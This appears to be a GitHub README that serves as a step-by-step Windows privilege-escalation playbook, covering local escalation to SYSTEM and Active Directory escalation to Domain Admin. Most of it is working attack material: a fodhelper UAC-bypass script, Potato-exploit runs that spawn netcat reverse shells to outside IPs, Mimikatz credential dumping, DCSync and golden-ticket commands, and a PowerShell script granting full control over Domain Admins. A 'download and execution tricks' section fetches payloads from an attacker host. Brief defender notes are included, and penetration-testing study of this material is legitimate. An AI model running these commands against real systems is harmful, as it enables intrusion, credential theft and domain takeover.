# Windows Privilege Escalation Techniques

Windows privilege escalation (priv-esc) covers both elevating a local user account to Administrator/SYSTEM on a host, and then leveraging that foothold to compromise higher privileges in an Active Directory domain. In practice attackers enumerate misconfigurations and vulnerable conditions (weak permissions, auto-elevated programs, Kerberos weaknesses, etc.) and exploit them with specialized tools (e.g. PrintSpoofer, JuicyPotato, Rubeus, Mimikatz). Below we survey modern techniques (Windows 10/11, Server 2016+) step-by-step, including example commands, tools and attack flow. Each method is broken into: (1) Discovery (how to find it), (2) Vulnerable Condition, (3) Exploitation (commands/Payload), and (4) Post-Exploitation notes. We also note detection/mitigation for defenders. At the end is a toolbox of useful scripts and commands (e.g. WinPEAS, BloodHound).

## Local Privilege Escalation (User → Administrator/SYSTEM)

Local privilege escalation means going from a non-admin user to Administrator (or SYSTEM) on the same machine. Enumeration is critical: tools like Seatbelt or WinPEAS can automate checks, but here we list key manual checks too.

- **Token Privileges**: Check `whoami /priv` for `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, etc. These can allow certain exploits (see "Token Impersonation").
- **Service Misconfigurations**: Use `sc qc <service>` or PowerShell `Get-CimInstance Win32_Service | select Name, StartName, PathName` to find services running as SYSTEM. Look for unquoted paths or writable paths in their PathName. For example, an unquoted service path `C:\\Program Files\\Vendor\\binary.exe` lets a user place `C:\\Program.exe` to hijack it. Also check service DACLs (`sc sdshow <name>`) or writable install directories. If a user can write to a service binary or folder, they can replace or hijack it.
- **File/Folder Permissions**: Enumerate files with high privileges but user-writeable. E.g., check C:\ root or Program Files subfolders for weak ACLs. Tools: `icacls` or Seatbelt (AutoRuns, Services, etc. sections). Example: installing a service under `C:\\Zabbix Agent\\` (inherited from C:\ root) allowed a user to drop a malicious DLL and hijack the service.
- **Scheduled Tasks**: `schtasks /query /FO LIST /V` (or `Get-ScheduledTask`) reveals tasks running as SYSTEM or Administrators. If a user can edit the task or its action, it yields LPE.
- **AlwaysInstallElevated (MSI install)**: Check registry:

```
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

```

If both HKLM and HKCU keys are DWORD 1, any user can run an MSI as SYSTEM. Exploit: create a malicious MSI (e.g. via `msfvenom -f msi` or `msiwrapper`) and run `msiexec /quiet /i payload.msi`. This spawns SYSTEM. AlwaysInstallElevated is rare by default, but misconfigured GPOs can enable it.

- **DLL Hijacking (DLL Proxying)**: If a SYSTEM service loads a DLL from a user-writable directory, placing a malicious DLL can escalate. This includes classic "DLL hijacking" and more complex "DLL proxying" (wrapping an existing DLL). For example, a Zabbix Agent installed in `C:\\Zabbix Agent\\` (writable) loaded a DLL that could be hijacked. Attacker finds the target DLL (e.g. using Sysinternals ProcMon), then crafts a proxy DLL with the same exports, injecting malicious code. On reboot or restart of the service, the DLL payload runs as SYSTEM. Detection: enforce strict ACLs on service folders, and update to prevent unsafe paths.
- **UAC Bypass**: Even if a user is in the Administrators group, Windows still enforces User Account Control (UAC) for medium-integrity apps. Known built-in auto-elevating executables can be abused:
- **Fodhelper.exe (Windows 10+)**. Fodhelper (Settings app helper) auto-elevates. An attacker can pre-create registry keys so that when fodhelper.exe runs, it will execute a chosen command as high-integrity. Example process:

```
# Create registry keys under HKCU so fodhelper will call our cmd
New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force
New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "cmd /c start powershell.exe" -Force

# Launch fodhelper (auto-elevates)
Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden

```

This pops an elevated PowerShell or CMD (integrity HIGH) without a prompt. (Any program can be run instead of powershell). Then delete the keys. Detection: monitor creation of these specific registry keys.

- **Eventvwr.exe (Event Viewer)**. Eventvwr is marked auto-elevate. A common exploit uses a malicious msc file association. A user can set HKCU file associations so that when eventvwr.exe runs, it executes arbitrary code. For example, one tool compiles a small C program (eventvwr-bypassuac.c) that sets `HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\Command` to the payload, then runs eventvwr.exe to launch it. After running it, the attacker has a high-integrity shell. As shown by k4sth4, running the compiled eventvwr-bypassuac-64.exe yields a reverse shell at HIGH integrity. Then with high integrity, one can use PsExec or similar to get SYSTEM (e.g. `psexec -s`).
- **Other UAC bypasses**: There are many (fodhelper, eventvwr, sdclt, slui, etc.) used in Metasploit modules or scripts. The common pattern is: find an auto-elevated process, manipulate a registry/file it reads under HKCU, then launch it. (Detection: track process launches of these binaries, and anomalous HKCU registry writes.)
- **Token Impersonation (Potato Exploits)**: Tools like PrintSpoofer, JuicyPotato/GodPotato/RoguePotato abuse SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to convert a service account token to SYSTEM. The classic RottenPotato variants exploit COM/DCOM or the Print Spooler "printer bug". Conditions: the current user (often a service account or LOCAL SERVICE/NETWORK SERVICE) must have SeImpersonatePrivilege (common on recent Windows for network services).
- **PrintSpoofer (by @itm4n)**: Uses the print spooler service to impersonate SYSTEM. Requirements: current user has SeImpersonatePrivilege. Exploit: run `PrintSpoofer.exe -c <command>` to spawn `<command>` as SYSTEM. For example:

```
C:\\tools> PrintSpoofer.exe -i -c cmd.exe

```

This listens on a pipe and then launches a SYSTEM cmd in your current window. In the example, the output shows it finds the privilege and returns nt authority\system. It can also spawn on a given desktop or start a reverse shell:

```
C:\\tools> PrintSpoofer.exe -c "C:\\Tools\\nc.exe 10.10.13.37 1337 -e cmd"

```

spawns a reverse shell as SYSTEM.

- **JuicyPotato / JuicyPotatoNG**: Uses DCOM COM interfaces to trigger authentication with SYSTEM. Requirements: SeImpersonate or SeAssignPrimaryToken, and a suitable COM CLSID (there are many defaults, e.g. BITS CLSID). Exploit: run `JuicyPotato.exe -t * -p <payload> -l <port>` (try both CreateProcessWithToken and CreateProcessAsUser). Example:

```
C:\\> JuicyPotato.exe -t * -p C:\\windows\\system32\\cmd.exe -l 443

```

This binds a listener on port 443, sets up a COM server, then triggers it. On success it returns a SYSTEM shell. (If you have a reverse shell tool shell.exe, you could do -p shell.exe and pick off a connection).

- **GodPotato / RoguePotato**: Newer variants for Win10/2019+. They similarly use customized DCOM OXID resolver techniques. For example, as shown by Arunkumar, after getting a shell as LOCAL SERVICE (with SeImpersonate enabled), RoguePotato is run like:

```
C:\\PrivEsc> RoguePotato.exe -r 10.9.3.94 -e "C:\\PrivEsc\\reverse.exe" -l 9999

```

This prints threads "Creating Rogue OXID resolver" and ultimately spawns the payload as SYSTEM. The flags are -r `<attackerIP>` -e `<exe>` -l `<port>`. (GodPotato usage is similar with -cmd `"<command>"`). Example:

```
# Download GodPotato, then run it with PowerShell on a Windows 2012+ target:
powershell -c wget http://<attacker>/GodPotato-NET4.exe -OutFile potato.exe
C:\\> .\\GodPotato.exe -cmd "C:\\Tools\\nc.exe -e cmd.exe 192.168.45.162 4040"

```

This yields a SYSTEM reverse shell. Tools like PrintSpoofer/Juicy/God/Rogue all achieve the same end: SYSTEM. Mitigation: remove unnecessary SeImpersonatePrivilege from service accounts, or disable/disallow the vulnerable COM interfaces (hard).

- **SeDebugPrivilege**: Some accounts have SeDebug (like backup operators). With SeDebugPrivilege, one can open SYSTEM process tokens (e.g. PsGetSid/PsExec or Mimikatz) to spawn SYSTEM. For example, using Mimikatz:

```
privilege::debug
token::elevate
sekurlsa::logonPasswords

```

or using SysInternals' ProcExp or PsExec -s. Failing above, check for any service running as admin with one of these privileges.

- **Legacy Vulnerabilities**: Though focus is on modern Windows, some old issues still appear. For completeness:
• **Sticky Keys (utilman.exe) or sethc.exe**: If an admin has accidentally copy-pasted a malicious binary over these, pressing SHIFT x5 on the login screen yields an SYSTEM shell.
• **AlwaysInstallElevated** we covered.
• **Bad Software Exploits**: Unpatched flaws like PrintNightmare (CVE-2021-34527) allowed non-admins to become SYSTEM via the spooler; ensure patches to avoid such kernel exploits. (Defenders: keep OS updated, restrict services.)

### Post-Exploitation (Local)

After any LPE to SYSTEM, attacker typically has nt authority\system with full control. They can dump credentials (mimikatz), enable RDP, create backdoor admin accounts, etc. If on a domain-joined machine, they may harvest Kerberos tickets or trust accounts for lateral movement.

## Domain/Remote Privilege Escalation (Workstation → Domain Admin)

Once an attacker controls an Administrator or SYSTEM on one machine (or directly compiles AD credentials), they target the domain. Common objectives are obtaining domain user hashes/tickets and promoting to Domain Admin.

### Domain Enumeration

- **Collect Domain Data**: Use BloodHound/SharpHound or PowerView to map the AD. For example, run on any domain-joined host:

```
.\\SharpHound.exe -c All

```

This collects AD objects, group membership, ACLs, local admin data, etc. Import into BloodHound to visualize privilege paths.

- **PowerView**: From a Domain Admin's perspective, tools like PowerView can enumerate other users, SPNs, ACLs, trusts. Commands include:

```
# List all users without Kerberos preauth (AS-REP roastable)
Get-DomainUser -PreauthNotRequired -Properties sAMAccountName

# List SPNs (Service Principal Names) for Kerberoasting
Get-NetSPN | select ServiceClass, UserAccount

# Check group memberships, etc.
Get-NetUser -UserName <target>

```

- **Credentials**: If the local admin has the host's cached domain credentials, use kiwi or CrackMapExec to extract (`kiwi::lsa::backupkey`, `Invoke-Mimikatz`).

### From Domain User to Domain Admin

Once you have a low-privileged domain account (initial foothold), escalate within AD:

- **Kerberoasting (TGS Attacks)**: Any domain user can request Kerberos service tickets for SPNs and crack them offline.
- **Discovery**: Use [GetUserSPNs.py](http://getuserspns.py/) (Impacket) or Rubeus. For example:

```
GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request

```

This outputs service tickets ($krb5tgs$23$...) for each SPN account.

- **Exploit**: Crack the hash using Hashcat (-m 13100). Rubeus can automate both request and crack:

```
Rubeus.exe kerberoast /tgtdeleg
Rubeus.exe kerberoast /rc4opsec

```

Example:

```
Rubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ss /outfile:hashes.txt

```

The output hashes.txt contains Kerberoast hashes ($krb5tgs$23$...). Crack with `hashcat -m 13100 hashes.txt wordlist.txt`.

- **Post-Exploitation**: Cracked passwords give service account creds. If these are DA or compromise jump hosts, use those.
- **AS-REP Roasting**: Targets domain users with "dontRequirePreAuth" flag.
- **Discovery**: Identify users with preauth disabled. PowerView: `Get-DomainUser -PreauthNotRequired`, or LDAP filter (userAccountControl: 1.2.840.113556.1.4.803:=4194304).
- **Exploit**: Rubeus or Impacket's GetNPUsers. Example:

```
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast

```

This yields an AS-REP hash ($krb5asrep$...). Crack with Hashcat mode 18200 (`hashcat -m 18200 hashes.asreproast wordlist.txt`). Once cracked, login as that user.

- **Post-Exploitation**: If the user has high privileges (e.g. Domain Admin account with preauth disabled is rare, but sometimes help-desk or admin accounts have this).
- **Pass-the-Hash (PtH)**: If you obtain an NTLM hash (e.g. via Mimikatz from LSASS or stolen DCSync), you can authenticate as that user without knowing the password. Tools: Mimikatz (`sekurlsa::pth /user:<User> /ntlm:<Hash> /run:cmd.exe`), Impacket's `psexec.py -hashes <LM>:<NT>`, or `wmiexec.py` similarly. Example:

```
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:e8e5f72867cd11ff ... LAB\\Administrator@10.0.0.5

```

gives a shell as Lab\Administrator if the NTLM hash is correct. (Modern Windows may require AES/PAC, but NTLM is often enough for legacy services.) PtH is a fundamental lateral movement technique.

- **Pass-the-Ticket / Golden Ticket**: If you compromise the KRBTGT account (the AD Kerberos service account) by obtaining its NT hash (e.g. via DCSync), you can forge Kerberos TGTs for any user (kerberos::golden in Mimikatz). For instance:

```
privilege::debug
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:<KRBTGT-NT-Hash> /user:Administrator /groups:500
kerberos::ptt /ticket:<ticket.kirbi>

```

This creates a TGT for Administrator (SID ending in 500) which you then "Pass the Ticket" to become Domain Admin. (Detection: monitor unusual krbtgt account activity, tickets with very long lifetimes.)

- **DCSync (Directory Replication)**: If a user has Replicating Directory Changes rights, they can query a DC for password hashes of any account. The classic tool is Mimikatz:

```
privilege::debug
lsadump::dcsync /domain:domain.local /user:krbtgt

```

This fetches the krbtgt hash (used for Golden Ticket) and all other AD password hashes. Impacket's [secretsdump.py](http://secretsdump.py/) can also do this if given a domain admin's creds. Detection: DCSync is noisy – watch for GetChanges on the KRBTGT or domain.

- **AD ACL Abuse**: Misconfigured Active Directory permissions can yield DA. For example, if a low-privileged user has GenericAll or WriteDACL on a high-privilege object (like the Domain Admins group), they can modify it. Enumeration: use BloodHound or PowerView's Get-ObjectAcl. Example:

```
Get-ObjectAcl -Identity "CN=Domain Admins,CN=Users,DC=domain,DC=com" -ResolveGUIDs

```

Look for a non-admin user with rights like GenericAll (full control) or WriteDACL. If found, the attacker can add themselves to Domain Admins. Exploitation (PowerShell example):

```
# Define objects
$user = New-Object System.Security.Principal.NTAccount("domain\\user1")
$group = "CN=Domain Admins,CN=Users,DC=domain,DC=com"
$acl = Get-Acl -Path "AD:$group"

# Create rule granting GenericAll to user
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user, "GenericAll", "Allow")
$acl.AddAccessRule($rule)

# Apply
Set-Acl -Path "AD:$group" -AclObject $acl

```

This gives user1 full control of Domain Admins. Then the attacker can add themselves to that group or reset a DA password. They could also escalate by taking WriteDACL on an account and adding GenericAll via ACL modifications. (This method requires existing mispermitted rights in AD, which BloodHound helps find.)

- **Kerberos Delegation**: If an attacker finds a computer or user account with unconstrained delegation, NTLM Relay, or resource-based constrained delegation, they may steal service tickets of higher users. E.g., if MachineA is unconstrained-delegated to a service that DA logs into, capturing its TGS can allow forging tickets. (Using Rubeus/Kerberos tools). These are advanced topics; defenders should limit delegation to necessary hosts.
- **Other AD Attacks**: Depending on environment, other tricks include:
• **Over-Pass-the-Hash (Pass-the-Key)**: Using Kerberos off-the-hash (AS-REP trick), e.g. `Rubeus.exe asktgt /user:USER /rc4:<NTLM>` can authenticate via Kerberos with an NT hash.
• **Shadow Credentials (Silver Tickets)**: If a service's NTLM secret is known, forge a service ticket (`kerberos::golden /service:<SPN>`).
• **Certificate Services / Silver**: Exploiting AD CS (e.g. request a cert as DC) beyond scope here.
• **Group Policy Preferences**: If GPP syskey or cpassword is known (legacy), use that to get creds.

### Post-Exploitation (Domain)

After obtaining Domain Admin, attacker can do anything: extract the entire AD (e.g. ntdsutil to get ntds.dit), add backdoor accounts, install DC malware (DSShadow), etc. Always assume compromise is total.

## Case Studies and Scenarios

We now illustrate a few real-world examples drawn from CTFs and blogs:

- **GodPotato Exploit**: Suppose we have a service account with SeImpersonate. We enumerate with `whoami /priv` and see `SeImpersonatePrivilege: Enabled`. We download GodPotato:

```
powershell -c "wget <http://attacker/GodPotato.exe> -OutFile GodPotato.exe"

```

Then run it with a payload:

```
C:\\> GodPotato.exe -cmd "C:\\Tools\\nc.exe -e cmd.exe 192.168.45.162 4040"

```

As soon as GodPotato triggers, we see a reverse shell incoming, and whoami on the shell shows nt authority\system. This matches Nikhil Anand's example of PrintSpoofer/Juicy/GodPotato usage for LPE.

- **UAC Bypass via Fodhelper**: We're on a machine as a local administrator, but UAC is on. We run the PowerShell script from PentestLab: it creates the HKCU registry structure and starts fodhelper.exe (with window hidden). Immediately, we see a new elevated PowerShell prompt. We check `whoami /priv` and see our process is at high integrity (no UAC). This matches the documented Fodhelper bypass. With this elevated shell, we can e.g. run `net user /add` or Mimikatz to go further.
- **ACL Exploit (BloodHound)**: In BloodHound we notice user123 has WriteDACL on the Domain Admins group. Using PowerShell on a domain-joined machine (with domain creds), we execute the steps above to grant GenericAll to user123. After doing Set-Acl, we verify with PowerView:

```
Get-ObjectAcl -Identity "CN=Domain Admins,CN=Users,DC=domain,DC=com" | Where {$_.IdentityReference -match "user123"}

```

and see user123 has full rights. We then run `net group "Domain Admins" user123 /add` or reset an Admin password via PowerShell. Now user123 logs in as a DA. This is exactly the Shebin53 scenario. Detection: normally audited; defenders should have alerts on changes to Domain Admin group ACLs.

- **Kerberoast Crack**: We use Rubeus to kerberoast as a low-priv user:

```
Rubeus.exe kerberoast /rc4opsec /format:hashcat /outfile:krb.txt

```

We then crack krb.txt with Hashcat. This yields a service account's NTLM password. Upon RDP login with that account, we achieve lateral privilege on the file server where it was SPN'd.

- **DCSync to DA**: Having already gotten a shell as a normal domain user on a DC (via psexec or stolen creds), we run Mimikatz with Domain Admin tokens:

```
lsadump::dcsync /domain:corp.local /user:krbtgt

```

Mimikatz returns the KRBTGT hash. Then:

```
kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:<hash> /user:Administrator /groups:512
kerberos::ptt /ticket:Administrator.kirbi

```

Now we have a persistent DA ticket (golden ticket). This was demonstrated in posts, although they stop after DCSync. Once we have DA, cleanup and persistence can follow.

## Mitigations and Detection

Defenders should be aware of all the above vectors. In general: patch systems (especially for known exploits like PrintNightmare), enforce least privilege (avoid giving SeImpersonate/SeDebug to many accounts), use WDAC/AppLocker to prevent unauthorized DLLs or binaries, monitor registry writes for UAC bypass keys, and track abnormal AD ACL changes. Use tools like BloodHound defensively to audit AD permissions, and enable Kerberos pre-auth (mitigate AS-REP) and strong passwords (mitigate Kerberoast).

## Toolbox: Commands, Tools, and Scripts

Below are key commands and tools for enumeration and exploitation. Tools can be downloaded directly (e.g. via wget or certutil in CMD/Powershell):

- **WinPEAS/PowerUp/SharpUp**: Auto-enumeration scripts for Windows LPE.
• **WinPEAS (PowerShell)**: enumerate everything (services, users, patchlevel). Run via Invoke-Expression (IWR -useb [raw.githubusercontent.com/carlospolop/PEASS-ng/.../winPEAS.ps1](http://raw.githubusercontent.com/carlospolop/PEASS-ng/.../winPEAS.ps1)).
• **PowerUp (PowerSploit)**: run `Import-Module PowerUp; Invoke-AllChecks` to find common misconfigs.
• **SharpUp (GhostPack/C#)**: SharpUp.exe (part of Seatbelt suite) will perform similar checks. Example:

```
SharpUp.exe > privesc.txt

```

This lists privileges, weak permissions, etc.

- **Seatbelt**: Host-survey tool by GhostPack. Run `Seatbelt.exe -group=All` (or `group=user` if not admin). It outputs info on token privileges, UAC, startup folders, Services, RDP, NTLM policy, etc. Example output lines might show TokenPrivileges and UAC status.
- **System Info/Enumeration Commands (Manual)**:

```
whoami /priv                    # check token privileges
systeminfo                      # OS version, patch level
net user                        # local users
net localgroup administrators  # local admin group members
sc qc <service>                 # check service binary path
wmic service list brief /format:list  # list services
Get-ChildItem -Recurse -Force C:\\  # find world-writable dirs
reg query HKLM\\Security /s      # find registry ACLs
gpresult /h gpreport.html       # group policy analysis

```

- **Download Tools**: Use built-in means if you have limited tools:
• **PowerShell**: `powershell -Command "(New-Object System.Net.WebClient).DownloadFile('<http://attacker/tool.exe','tool.exe>')"` or `Invoke-WebRequest`.
• **BitsAdmin**: `bitsadmin /transfer myjob /download /priority normal <http://attacker/file.exe> C:\\Tools\\file.exe`.
• **CertUtil**: `certutil -urlcache -f <http://attacker/tool.exe> tool.exe`.
• **Git (if available)**: `git clone <https://github.com/Whonix/usertools`> for scripts, etc.
- **Impacket & Rubeus (Domain tools)**:
• `GetUserSPNs.py domain.com/user:pass -request` (Impacket) to harvest Kerberos tickets.
• `GetNPUsers.py domain.com/user -no-pass` to get AS-REP hashes (needs known account).
• `secretsdump.py domain.com/administrator:pass@dc_ip` to dump NTDS hashes or DCSync.
• **Rubeus.exe** (compiled C#) for Kerberos:
◦ `Rubeus.exe asreproast /user:<noPreauthUser> /rc4:<NTLM>`
◦ `Rubeus.exe kerberoast /domain:corp.local /outfile:hash.txt`
◦ `Rubeus.exe dump /service:ldap` (LDIF dump) etc.
- **Mimikatz**: Run as SYSTEM (`sekurlsa::logonpasswords`) to dump credentials. Use `sekurlsa::pth` and `kerberos::golden`, `lsadump::dcsync` for AD. Example:

```
privilege::debug
lsadump::dcsync /domain:corp.local /user:administrator
kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /user:Administrator /rc4
kerberos::ptt /ticket:Administrator.kirbi
sekurlsa::pth /user:krbtgt@corp.local /ntlm:<hash>

```

- **BloodHound/SharpHound**: Collect AD data with SharpHound.exe (Athena queries or ACL scan), then analyze relationships. Example:

```
SharpHound.exe -c All

```

# Import the resulting JSON into BloodHound GUI or [BloodHound.py](http://bloodhound.py/) for queries

- **Seatbelt/Proc**: Tools for live attacks: ProcExp64 (Sysinternals) to inspect services and tokens; [psexec.py](http://psexec.py/) (Impacket) to run commands with stolen creds; [wmiexec.py](http://wmiexec.py/); [smbexec.py](http://smbexec.py/).

### Key Commands Summary:

- **Local discovery**:
• `whoami /all`, `whoami /priv`
• `net localgroup administrators`
• `icacls C:\\Folder` (check permissions)
• `Get-AppLockerPolicy -Effective` (if AppLocker is used)
- **UAC bypass**:
• (PowerShell) script as above for fodhelper.
• Compile/run eventvwr-bypass.
- **Spooler/Impersonation**:
• Ensure `whoami /priv` shows SeImpersonatePrivilege.
• Upload & run `PrintSpoofer.exe -i -c cmd.exe`
• Upload & run `JuicyPotato.exe -t * -p cmd.exe -l 443`
- **DLL hijack**:
• Run procmon on an Administrator-started test to find a DLL loaded from a writable location. Create the proxy DLL accordingly.
- **Service exploits**:
• `sc qc <service>` to spot unquoted paths or hex-NULL terminations (for DLL hijack).
- **Domain enumeration**:
• `Get-ADUser -Filter * -Properties *` (if domain rights), or `Get-NetUser` in PowerView.
• `Get-ADObject -SearchBase "CN=Users,DC=domain,DC=com" -LDAPFilter "(|(genericAll=*)(writeDacl=*))"` (to find ACL abuses).
- **Kerberos**:
• `setspn -Q */*` (to query SPNs)
• ldapsearch or PowerView to find preauth-disabled: (userAccountControl: 1.2.840.113556.1.4.803:=4194304).
- **AD ACL manipulation** (requires delegated rights):
• `Get-ObjectAcl -Identity "CN=Domain Admins,..." -ResolveGUIDs`.
• PowerShell to Get-Acl, AddAccessRule, Set-Acl.
- **Lateral/Domain exploit**:
• `mimikatz # sekurlsa::logonpasswords`
• `impacket-psexec -hashes LM:NT domain\\user@target`
• `powershell -Command "Invoke-Mimikatz -Command 'lsadump::dcsync /domain:corp /user:krbtgt'"` (if module loaded).

### Download & Execution Tricks:

- **Certutil**:

```
certutil -urlcache -f <http://attacker/Invoke-PowerShellTcp.ps1> script.ps1

```

Then run `powershell -ExecutionPolicy Bypass -File script.ps1` to get a reverse shell.

- **Bitsadmin**:

```
bitsadmin /transfer myjob /download /priority normal <http://attacker/rusty.exe> C:\\Windows\\Temp\\rusty.exe
start C:\\Windows\\Temp\\rusty.exe

```

- **PowerShell IWR/Invoke-Expression**:

```
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('<http://attacker/Invoke-Inveigh.ps1>')"

```

- **Git** (if Git is on path): `git clone <https://github.com/PowerShellMafia/PowerSploit`>.
- **WMI**: Rarely, `wmic process call create` can spawn elevated processes under some conditions.

Harnessing these tools and techniques systematically allows an attacker (or penetration tester) to traverse User → Admin/SYSTEM → Domain Admin in a Windows environment. Defenders should monitor for the usage patterns described (unusual binary executions, registry changes, DCSync traffic, etc.) to detect such attacks.

## Sources

Detailed technical references and examples are from community-sourced writeups and tools documentation and others as cited. These illustrate each technique's steps and outcomes in real scenarios.

1. Privilege Escalation on Windows (With Examples) - https://delinea.com/blog/windows-privilege-escalation
2. Windows Privilege Escalation - DLL Proxying | itm4n's blog - https://itm4n.github.io/dll-proxying/
3. Windows Local Privilege Escalation | hacktricks - https://angelica.gitbook.io/hacktricks/windows-hardening/windows-local-privilege-escalation
4. UAC Bypass – Fodhelper – Penetration Testing Lab - https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
5. GitHub - k4sth4/UAC-bypass: Windows Privilege Escalation - https://github.com/k4sth4/UAC-bypass
6. GitHub - itm4n/PrintSpoofer: Abusing impersonation privileges through the "Printer Bug" - https://github.com/itm4n/PrintSpoofer
7. Complete Windows Privilege Escalation... | by Arunkumar R | Medium - https://0xarun.medium.com/complete-windows-privilege-escalation-9841d5ab82a6
8. Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege) | by Nikhil Anand | Medium - https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070
9. Abusing Active Directory ACLs for Privilege Escalation: A Red Team Guide | by Shebin53 | Medium - https://medium.com/@shebinjohn53/abusing-active-directory-acls-for-privilege-escalation-a-red-team-guide-90ac1692b73f
10. Roasting - Kerberoasting - Internal All The Things - https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-kerberoasting/
11. Roasting - ASREP Roasting - Internal All The Things - https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-asrep/
12. Pass The Hash Attack | Netwrix - https://www.netwrix.com/pass_the_hash_attack_explained.html
13. sharpup | WADComs - https://wadcoms.github.io/wadcoms/SharpUp/
14. GitHub - GhostPack/Seatbelt: Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. - https://github.com/GhostPack/Seatbelt
15. [Priv-Esc](https://github.com/Abr-ahamis/Priv-Esc/edit/main/README.md)



## License
This project is licensed under the [CC BY 4.0 License](https://creativecommons.org/licenses/by/4.0/).
